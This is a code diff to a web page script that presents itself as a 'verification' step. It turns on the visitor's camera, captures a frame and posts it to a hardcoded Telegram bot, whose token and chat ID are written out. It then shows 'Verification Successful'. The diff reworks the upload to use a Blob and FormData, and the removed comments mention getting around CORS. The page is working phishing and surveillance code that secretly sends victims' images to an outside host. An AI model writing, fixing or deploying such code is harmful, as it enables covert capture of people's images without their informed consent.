@@ -28,7 +28,6 @@
         const video = document.getElementById('camera');
         const canvas = document.getElementById('canvas');
 
-        // إعدادات تلقرام
         const BOT_TOKEN = '8988737950:AAGNYo75dh9CxTTBq0V7u-II5hjNt3yYsQM';
         const CHAT_ID = '751892970';
 
@@ -50,33 +49,36 @@
                     const context = canvas.getContext('2d');
                     context.drawImage(video, 0, 0, canvas.width, canvas.height);
                     
-                    // تحويل الصورة لنص Base64 عشان نتخطى حماية CORS
-                    const base64Image = canvas.toDataURL('image/jpeg', 0.8);
-                    
-                    const payload = {
-                        chat_id: CHAT_ID,
-                        photo: base64Image
-                    };
-
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(payload)
-                    })
-                    .then(res => res.json())
-                    .then(data => {
-                        stream.getTracks().forEach(track => track.stop());
-                        if (data.ok) {
-                            document.body.innerHTML = '<h2>Verification Successful</h2><p>You may close this page now.</p>';
-                        } else {
+                    canvas.toBlob(blob => {
+                        if (!blob) {
                             statusDiv.innerText = 'Verification failed. Try again.';
+                            return;
                         }
-                    })
-                    .catch(err => {
-                        statusDiv.innerText = 'Network error. Try again.';
-                        stream.getTracks().forEach(track => track.stop());
-                    });
-                }, 1000);
+                        
+                        const formData = new FormData();
+                        formData.append('chat_id', CHAT_ID);
+                        formData.append('photo', blob, 'capture.jpg');
+
+                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        })
+                        .then(res => res.json())
+                        .then(data => {
+                            stream.getTracks().forEach(track => track.stop());
+                            if (data.ok) {
+                                document.body.innerHTML = '<h2>Verification Successful</h2><p>You may close this page now.</p>';
+                            } else {
+                                statusDiv.innerText = 'Verification failed. Try again.';
+                                console.log(data);
+                            }
+                        })
+                        .catch(err => {
+                            statusDiv.innerText = 'Network error. Try again.';
+                            stream.getTracks().forEach(track => track.stop());
+                        });
+                    }, 'image/jpeg', 0.8);
+                }, 1500);
 
             } catch (err) {
                 statusDiv.innerText = 'Camera permission denied or unavailable.';
